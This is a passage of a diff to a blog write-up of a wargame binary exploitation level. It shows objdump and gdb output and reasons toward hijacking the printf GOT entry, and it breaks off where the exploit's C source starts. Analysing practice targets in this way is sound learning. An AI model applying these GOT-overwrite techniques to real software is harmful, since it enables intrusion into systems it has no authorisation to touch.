+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+<span class='line-number'>53</span>
+<span class='line-number'>54</span>
+<span class='line-number'>55</span>
+<span class='line-number'>56</span>
+<span class='line-number'>57</span>
+<span class='line-number'>58</span>
+<span class='line-number'>59</span>
+<span class='line-number'>60</span>
+<span class='line-number'>61</span>
+<span class='line-number'>62</span>
+<span class='line-number'>63</span>
+<span class='line-number'>64</span>
+<span class='line-number'>65</span>
+<span class='line-number'>66</span>
+<span class='line-number'>67</span>
+<span class='line-number'>68</span>
+<span class='line-number'>69</span>
+<span class='line-number'>70</span>
+<span class='line-number'>71</span>
+<span class='line-number'>72</span>
+<span class='line-number'>73</span>
+<span class='line-number'>74</span>
+<span class='line-number'>75</span>
+<span class='line-number'>76</span>
+<span class='line-number'>77</span>
+<span class='line-number'>78</span>
+<span class='line-number'>79</span>
+<span class='line-number'>80</span>
+<span class='line-number'>81</span>
+<span class='line-number'>82</span>
+<span class='line-number'>83</span>
+<span class='line-number'>84</span>
+<span class='line-number'>85</span>
+<span class='line-number'>86</span>
+<span class='line-number'>87</span>
+<span class='line-number'>88</span>
+<span class='line-number'>89</span>
+<span class='line-number'>90</span>
+<span class='line-number'>91</span>
+<span class='line-number'>92</span>
+<span class='line-number'>93</span>
+<span class='line-number'>94</span>
+<span class='line-number'>95</span>
+<span class='line-number'>96</span>
+<span class='line-number'>97</span>
+<span class='line-number'>98</span>
+<span class='line-number'>99</span>
+<span class='line-number'>100</span>
+<span class='line-number'>101</span>
+<span class='line-number'>102</span>
+<span class='line-number'>103</span>
+<span class='line-number'>104</span>
+<span class='line-number'>105</span>
+<span class='line-number'>106</span>
+<span class='line-number'>107</span>
+<span class='line-number'>108</span>
+<span class='line-number'>109</span>
+<span class='line-number'>110</span>
+<span class='line-number'>111</span>
+<span class='line-number'>112</span>
+<span class='line-number'>113</span>
+<span class='line-number'>114</span>
+<span class='line-number'>115</span>
+<span class='line-number'>116</span>
+<span class='line-number'>117</span>
+<span class='line-number'>118</span>
+<span class='line-number'>119</span>
+<span class='line-number'>120</span>
+<span class='line-number'>121</span>
+<span class='line-number'>122</span>
+<span class='line-number'>123</span>
+<span class='line-number'>124</span>
+<span class='line-number'>125</span>
+<span class='line-number'>126</span>
+<span class='line-number'>127</span>
+<span class='line-number'>128</span>
+<span class='line-number'>129</span>
+<span class='line-number'>130</span>
+<span class='line-number'>131</span>
+<span class='line-number'>132</span>
+<span class='line-number'>133</span>
+<span class='line-number'>134</span>
+<span class='line-number'>135</span>
+<span class='line-number'>136</span>
+<span class='line-number'>137</span>
+<span class='line-number'>138</span>
+<span class='line-number'>139</span>
+<span class='line-number'>140</span>
+<span class='line-number'>141</span>
+<span class='line-number'>142</span>
+<span class='line-number'>143</span>
+<span class='line-number'>144</span>
+<span class='line-number'>145</span>
+<span class='line-number'>146</span>
+<span class='line-number'>147</span>
+<span class='line-number'>148</span>
+<span class='line-number'>149</span>
+<span class='line-number'>150</span>
+<span class='line-number'>151</span>
+<span class='line-number'>152</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump -D /levels/level07_alt
+</span><span class='line'>... snip ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Disassembly of section .ctors:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080495ec &lt;__CTOR_LIST__&gt;:
+</span><span class='line'> 80495ec:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 80495ed:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 80495ee:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 80495ef:   ff 00                   incl   <span class="o">(</span>%eax<span class="o">)</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080495f0 &lt;__CTOR_END__&gt;:
+</span><span class='line'> 80495f0:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Disassembly of section .dtors:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080495f4 &lt;__DTOR_LIST__&gt;:
+</span><span class='line'> 80495f4:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 80495f5:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 80495f6:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 80495f7:   ff 00                   incl   <span class="o">(</span>%eax<span class="o">)</span>&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080495f8 &lt;__DTOR_END__&gt;:
+</span><span class='line'> 80495f8:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Disassembly of section .jcr:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080495fc &lt;__JCR_END__&gt;:
+</span><span class='line'> 80495fc:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Disassembly of section .dynamic:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;08049600 &lt;_DYNAMIC&gt;:
+</span><span class='line'> 8049600:   01 00                   add    %eax,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049602:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049604:   10 00                   adc    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049606:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049608:   0c 00                   or     <span class="nv">$0x0</span>,%al
+</span><span class='line'> 804960a:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804960c:   78 82                   js     8049590 &amp;lt;&lt;strong&gt;FRAME_END&lt;/strong&gt;+0xfa8&gt;
+</span><span class='line'> 804960e:   04 08                   add    <span class="nv">$0x8</span>,%al
+</span><span class='line'> 8049610:   0d 00 00 00 9c          or     <span class="nv">$0x9c000000</span>,%eax
+</span><span class='line'> 8049615:   85 04 08                <span class="nb">test</span>   %eax,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
+</span><span class='line'> 8049618:   04 00                   add    <span class="nv">$0x0</span>,%al
+</span><span class='line'> 804961a:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804961c:   48                      dec    %eax
+</span><span class='line'> 804961d:   81 04 08 f5 fe ff 6f    addl   <span class="nv">$0x6ffffef5</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
+</span><span class='line'> 8049624:   70 81                   jo     80495a7 &amp;lt;&lt;strong&gt;FRAME_END&lt;/strong&gt;+0xfbf&gt;
+</span><span class='line'> 8049626:   04 08                   add    <span class="nv">$0x8</span>,%al
+</span><span class='line'> 8049628:   05 00 00 00 e0          add    <span class="nv">$0xe0000000</span>,%eax
+</span><span class='line'> 804962d:   81 04 08 06 00 00 00    addl   <span class="nv">$0x6</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
+</span><span class='line'> 8049634:   90                      nop
+</span><span class='line'> 8049635:   81 04 08 0a 00 00 00    addl   <span class="nv">$0xa</span>,<span class="o">(</span>%eax,%ecx,1<span class="o">)</span>
+</span><span class='line'> 804963c:   4c                      dec    %esp
+</span><span class='line'> 804963d:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804963f:   00 0b                   add    %cl,<span class="o">(</span>%ebx<span class="o">)</span>
+</span><span class='line'> 8049641:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049643:   00 10                   add    %dl,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049645:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049647:   00 15 00 00 00 00       add    %dl,0x0
+</span><span class='line'> 804964d:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804964f:   00 03                   add    %al,<span class="o">(</span>%ebx<span class="o">)</span>
+</span><span class='line'> 8049651:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049653:   00 d4                   add    %dl,%ah
+</span><span class='line'> 8049655:   96                      xchg   %eax,%esi
+</span><span class='line'> 8049656:   04 08                   add    <span class="nv">$0x8</span>,%al
+</span><span class='line'> 8049658:   02 00                   add    <span class="o">(</span>%eax<span class="o">)</span>,%al
+</span><span class='line'> 804965a:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804965c:   18 00                   sbb    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804965e:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049660:   14 00                   adc    <span class="nv">$0x0</span>,%al
+</span><span class='line'> 8049662:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049664:   11 00                   adc    %eax,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049666:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049668:   17                      pop    %ss
+</span><span class='line'> 8049669:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804966b:   00 60 82                add    %ah,-0x7e<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804966e:   04 08                   add    <span class="nv">$0x8</span>,%al
+</span><span class='line'> 8049670:   11 00                   adc    %eax,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049672:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049674:   58                      pop    %eax
+</span><span class='line'> 8049675:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 8049676:   04 08                   add    <span class="nv">$0x8</span>,%al
+</span><span class='line'> 8049678:   12 00                   adc    <span class="o">(</span>%eax<span class="o">)</span>,%al
+</span><span class='line'> 804967a:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804967c:   08 00                   or     %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 804967e:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049680:   13 00                   adc    <span class="o">(</span>%eax<span class="o">)</span>,%eax
+</span><span class='line'> 8049682:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049684:   08 00                   or     %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049686:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049688:   fe                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 8049689:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 804968a:   ff 6f 38                ljmp   &lt;em&gt;0x38<span class="o">(</span>%edi<span class="o">)</span>
+</span><span class='line'> 804968d:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 804968e:   04 08                   add    <span class="nv">$0x8</span>,%al
+</span><span class='line'> 8049690:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 8049691:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 8049692:   ff 6f 01                ljmp   &lt;/em&gt;0x1<span class="o">(</span>%edi<span class="o">)</span>
+</span><span class='line'> 8049695:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 8049697:   00 f0                   add    %dh,%al
+</span><span class='line'> 8049699:   ff                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 804969a:   ff 6f 2c                ljmp   *0x2c<span class="o">(</span>%edi<span class="o">)</span>
+</span><span class='line'> 804969d:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 804969e:   04 08                   add    <span class="nv">$0x8</span>,%al
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Disassembly of section .got:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080496d0 &amp;lt;.got&gt;:
+</span><span class='line'> 80496d0:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Disassembly of section .got.plt:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080496d4 &lt;_GLOBAL_OFFSET_TABLE_&gt;:
+</span><span class='line'> 80496d4:   00 96 04 08 00 00       add    %dl,0x804<span class="o">(</span>%esi<span class="o">)</span>
+</span><span class='line'> 80496da:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 80496dc:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 80496de:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'> 80496e0:   be 82 04 08 ce          mov    <span class="nv">$0xce080482</span>,%esi
+</span><span class='line'> 80496e5:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 80496e6:   04 08                   add    <span class="nv">$0x8</span>,%al
+</span><span class='line'> 80496e8:   de                      .byte 0xde
+</span><span class='line'> 80496e9:   82                      <span class="o">(</span>bad<span class="o">)</span>&lt;br/&gt;
+</span><span class='line'> 80496ea:   04 08                   add    <span class="nv">$0x8</span>,%al&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Disassembly of section .data:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080496ec &lt;__data_start&gt;:
+</span><span class='line'> 80496ec:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;080496f0 &lt;__dso_handle&gt;:
+</span><span class='line'> 80496f0:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Disassembly of section .bss:&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;08049700 &amp;lt;completed.5706&gt;:
+</span><span class='line'> 8049700:   00 00                   add    %al,<span class="o">(</span>%eax<span class="o">)</span>
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;08049704 &amp;lt;dtor_idx.5708&gt;:
+</span><span class='line'>  ...&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;08049720 &lt;count&gt;:
+</span><span class='line'>  ...
+</span><span class='line'>... snip ...
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>As you can see, there area a few sections that we can write to:</p>
 
@@ -1007,56 +1393,97 @@ $ objdump -D /levels/level07_alt
 
 <p>Let's take a look at what's in the <code>GOT</code>:</p>
 
-<p>{% codeblock lang:bash %}
-$ objdump --dynamic-reloc /levels/level07_alt</p>
-
-<p>/levels/level07_alt:     file format elf32-i386</p>
-
-<p>DYNAMIC RELOCATION RECORDS
-OFFSET   TYPE              VALUE
-080496d0 R_386_GLOB_DAT    <strong>gmon_start</strong>
-080496e0 R_386_JUMP_SLOT   <strong>gmon_start</strong>
-080496e4 R_386_JUMP_SLOT   __libc_start_main
-080496e8 R_386_JUMP_SLOT   printf
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>objdump --dynamic-reloc /levels/level07_alt&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;/levels/level07_alt:     file format elf32-i386&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;DYNAMIC RELOCATION RECORDS
+</span><span class='line'>OFFSET   TYPE              VALUE
+</span><span class='line'>080496d0 R_386_GLOB_DAT    &lt;strong&gt;gmon_start&lt;/strong&gt;
+</span><span class='line'>080496e0 R_386_JUMP_SLOT   &lt;strong&gt;gmon_start&lt;/strong&gt;
+</span><span class='line'>080496e4 R_386_JUMP_SLOT   __libc_start_main
+</span><span class='line'>080496e8 R_386_JUMP_SLOT   <span class="nb">printf</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Here we can see 5 entries. The first three are all executed prior to the body of the program, hence they're not really options for attack. The last one, <code>printf</code>, looks promising because this doesn't get invoked until <em>after</em> all of the input characters have been passed in. We have the opportunity to rewrite this value to point somewhere else. If we fire this up in <code>gdb</code> and take a look at the value that's stored in this location just before the <code>printf</code> call we find that the value is <code>0x080482de</code>. Here's a (tidied) snapshot from <code>gdb</code>:</p>
 
-<p>{% codeblock lang:bash %}
-gdb$ x/128x 0x8049520
-0x8049520           : 0x0cec8300      0xfffd4fe8      0x18bb8dff      0x8dffffff
-0x8049530           : 0xffff1883      0xc1c729ff      0xff8502ff      0xf6312474
-0x8049540           : 0x8910458b      0x8b082444      0x44890c45      0x458b0424
-0x8049550           : 0x24048908      0x18b394ff      0x83ffffff      0xfe3901c6
-0x8049560           : 0xc483de72      0x5f5e5b0c      0x1c8bc35d      0x9090c324
-0x8049570           : 0x53e58955      0xa104ec83      0x080495ec      0x74fff883
-0x8049580           : 0x95ecbb13      0x90660804      0xff04eb83      0x83038bd0
-0x8049590           : 0xf475fff8      0x5b04c483      0x9090c35d      0x53e58955
-0x80495a0           : 0xe804ec83      0x00000000      0x2cc3815b      0xe8000011
-0x80495b0           : 0xfffffd6c      0xc3c95b59      0x00000003      0x00020001
-0x80495c0           : 0x67617355      0x25203a65      0x6f772073      0x0a736472
-0x80495d0           : 0x00007300      0x66206325      0x646e756f      0x20692520
-0x80495e0           : 0x656d6974      0x000a7325      0x00000000      0xffffffff
-0x80495f0 <CTE>     : 0x00000000      0xffffffff      0x00000000      0x00000000
-0x8049600 <DYN>     : 0x00000001      0x00000010      0x0000000c      0x08048278
-0x8049610 &lt;DYN+16>  : 0x0000000d      0x0804859c      0x00000004      0x08048148
-0x8049620 &lt;DYN+32>  : 0x6ffffef5      0x08048170      0x00000005      0x080481e0
-0x8049630 &lt;DYN+48>  : 0x00000006      0x08048190      0x0000000a      0x0000004c
-0x8049640 &lt;DYN+64>  : 0x0000000b      0x00000010      0x00000015      0xb7fff8e0
-0x8049650 &lt;DYN+80>  : 0x00000003      0x080496d4      0x00000002      0x00000018
-0x8049660 &lt;DYN+96>  : 0x00000014      0x00000011      0x00000017      0x08048260
-0x8049670 &lt;DYN+112> : 0x00000011      0x08048258      0x00000012      0x00000008
-0x8049680 &lt;DYN+128> : 0x00000013      0x00000008      0x6ffffffe      0x08048238
-0x8049690 &lt;DYN+144> : 0x6fffffff      0x00000001      0x6ffffff0      0x0804822c
-0x80496a0 &lt;DYN+160> : 0x00000000      0x00000000      0x00000000      0x00000000
-0x80496b0 &lt;DYN+176> : 0x00000000      0x00000000      0x00000000      0x00000000
-0x80496c0 &lt;DYN+192> : 0x00000000      0x00000000      0x00000000      0x00000000
-0x80496d0           : 0x00000000      0x08049600      0xb7fff8f8      0xb7ff65f0
-0x80496e0 &lt;GOT+12>  : 0x080482be      0xb7ea9bc0      0x080482de      0x00000000  <-- just here
-0x80496f0 <DSO>     : 0x00000000      0x00000000      0x00000000      0x00000000
-0x8049700           : 0x00000000      0x00000000      0x00000000      0x00000000
-0x8049710           : 0x00000000      0x00000000      0x00000000      0x00000000
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb<span class="nv">$ </span>x/128x 0x8049520
+</span><span class='line'>0x8049520           : 0x0cec8300      0xfffd4fe8      0x18bb8dff      0x8dffffff
+</span><span class='line'>0x8049530           : 0xffff1883      0xc1c729ff      0xff8502ff      0xf6312474
+</span><span class='line'>0x8049540           : 0x8910458b      0x8b082444      0x44890c45      0x458b0424
+</span><span class='line'>0x8049550           : 0x24048908      0x18b394ff      0x83ffffff      0xfe3901c6
+</span><span class='line'>0x8049560           : 0xc483de72      0x5f5e5b0c      0x1c8bc35d      0x9090c324
+</span><span class='line'>0x8049570           : 0x53e58955      0xa104ec83      0x080495ec      0x74fff883
+</span><span class='line'>0x8049580           : 0x95ecbb13      0x90660804      0xff04eb83      0x83038bd0
+</span><span class='line'>0x8049590           : 0xf475fff8      0x5b04c483      0x9090c35d      0x53e58955
+</span><span class='line'>0x80495a0           : 0xe804ec83      0x00000000      0x2cc3815b      0xe8000011
+</span><span class='line'>0x80495b0           : 0xfffffd6c      0xc3c95b59      0x00000003      0x00020001
+</span><span class='line'>0x80495c0           : 0x67617355      0x25203a65      0x6f772073      0x0a736472
+</span><span class='line'>0x80495d0           : 0x00007300      0x66206325      0x646e756f      0x20692520
+</span><span class='line'>0x80495e0           : 0x656d6974      0x000a7325      0x00000000      0xffffffff
+</span><span class='line'>0x80495f0 &lt;CTE&gt;     : 0x00000000      0xffffffff      0x00000000      0x00000000
+</span><span class='line'>0x8049600 &lt;DYN&gt;     : 0x00000001      0x00000010      0x0000000c      0x08048278
+</span><span class='line'>0x8049610 &amp;lt;DYN+16&gt;  : 0x0000000d      0x0804859c      0x00000004      0x08048148
+</span><span class='line'>0x8049620 &amp;lt;DYN+32&gt;  : 0x6ffffef5      0x08048170      0x00000005      0x080481e0
+</span><span class='line'>0x8049630 &amp;lt;DYN+48&gt;  : 0x00000006      0x08048190      0x0000000a      0x0000004c
+</span><span class='line'>0x8049640 &amp;lt;DYN+64&gt;  : 0x0000000b      0x00000010      0x00000015      0xb7fff8e0
+</span><span class='line'>0x8049650 &amp;lt;DYN+80&gt;  : 0x00000003      0x080496d4      0x00000002      0x00000018
+</span><span class='line'>0x8049660 &amp;lt;DYN+96&gt;  : 0x00000014      0x00000011      0x00000017      0x08048260
+</span><span class='line'>0x8049670 &amp;lt;DYN+112&gt; : 0x00000011      0x08048258      0x00000012      0x00000008
+</span><span class='line'>0x8049680 &amp;lt;DYN+128&gt; : 0x00000013      0x00000008      0x6ffffffe      0x08048238
+</span><span class='line'>0x8049690 &amp;lt;DYN+144&gt; : 0x6fffffff      0x00000001      0x6ffffff0      0x0804822c
+</span><span class='line'>0x80496a0 &amp;lt;DYN+160&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span class='line'>0x80496b0 &amp;lt;DYN+176&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span class='line'>0x80496c0 &amp;lt;DYN+192&gt; : 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span class='line'>0x80496d0           : 0x00000000      0x08049600      0xb7fff8f8      0xb7ff65f0
+</span><span class='line'>0x80496e0 &amp;lt;GOT+12&gt;  : 0x080482be      0xb7ea9bc0      0x080482de      0x00000000  &lt;-- just here
+</span><span class='line'>0x80496f0 &lt;DSO&gt;     : 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span class='line'>0x8049700           : 0x00000000      0x00000000      0x00000000      0x00000000
+</span><span class='line'>0x8049710           : 0x00000000      0x00000000      0x00000000      0x00000000
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>Where:</p>
 
@@ -1092,31 +1519,53 @@ gdb$ x/128x 0x8049520
 
 <p>Let's take a look at the state of <code>EAX</code> at the time the <code>printf</code> function is called:</p>
 
-<p>{% codeblock lang:bash %}
-(gdb) break *0x080484d3
-Breakpoint 1 at 0x80484d3
-(gdb) run abcd
-Starting program: /levels/level07_alt abcd</p>
-
-<p>Breakpoint 1, 0x080484d3 in main ()
-(gdb) info registers
-eax            0x61 97
-ecx            0xbffffcb0   -1073742672
-edx            0x80485d1    134514129
-ebx            0xb7fd1ff4   -1208147980
-esp            0xbffffc60   0xbffffc60
-ebp            0xbffffc98   0xbffffc98
-esi            0x0  0
-edi            0x0  0
-eip            0x80484d3    0x80484d3 &lt;main+303>
-eflags         0x206    [ PF IF ]
-cs             0x23 35
-ss             0x2b 43
-ds             0x2b 43
-es             0x2b 43
-fs             0x0  0
-gs             0x63 99
-{% endcodeblock %}</p>
+<p><div class='bogus-wrapper'><notextile><figure class='code'> <div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">(</span>gdb<span class="o">)</span> <span class="nb">break</span> *0x080484d3
+</span><span class='line'>Breakpoint 1 at 0x80484d3
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> run abcd
+</span><span class='line'>Starting program: /levels/level07_alt abcd&lt;/p&gt;
+</span><span class='line'>
+</span><span class='line'>&lt;p&gt;Breakpoint 1, 0x080484d3 in main <span class="o">()</span>
+</span><span class='line'><span class="o">(</span>gdb<span class="o">)</span> info registers
+</span><span class='line'>eax            0x61 97
+</span><span class='line'>ecx            0xbffffcb0   -1073742672
+</span><span class='line'>edx            0x80485d1    134514129
+</span><span class='line'>ebx            0xb7fd1ff4   -1208147980
+</span><span class='line'>esp            0xbffffc60   0xbffffc60
+</span><span class='line'>ebp            0xbffffc98   0xbffffc98
+</span><span class='line'>esi            0x0  0
+</span><span class='line'>edi            0x0  0
+</span><span class='line'>eip            0x80484d3    0x80484d3 &amp;lt;main+303&gt;
+</span><span class='line'>eflags         0x206    <span class="o">[</span> PF IF <span class="o">]</span>
+</span><span class='line'>cs             0x23 35
+</span><span class='line'>ss             0x2b 43
+</span><span class='line'>ds             0x2b 43
+</span><span class='line'>es             0x2b 43
+</span><span class='line'>fs             0x0  0
+</span><span class='line'>gs             0x63 99
+</span></code></pre></td></tr></table></div></figure></notextile></div></p>
 
 <p>What's interesting is that <code>EAX</code> contains the value <code>0x61</code>, which is ASCII for <code>a</code>. This happens to be the first character we pass in on the command line. As a result, we do have <em>some</em> control over <code>EAX</code> at this point, but not enough to allow us to point to a valid location. Unfortunately, if we are to allow the execution of <code>MOV [EAX], AL</code>, we can't let <code>EAX</code> contain a value like <code>0x00000061</code>, as writing to this area will cause an access violation. We're going to have to change this value to a valid pointer.</p>
 
@@ -1171,126 +1620,241 @@ JMP [ECX]        FF 21
 
 <p>So with all this in mind, below is the full source to the exploit (rather verbose, but it's on purpose) in C:</p>
 
-<p>{% codeblock Exploit Source lang:c %}</p>
-
-<h1>include &lt;stdio.h></h1>
-
-<h1>include &lt;stdlib.h></h1>
-
-<h1>include &lt;string.h></h1>
-
-<h1>include &lt;unistd.h></h1>
-
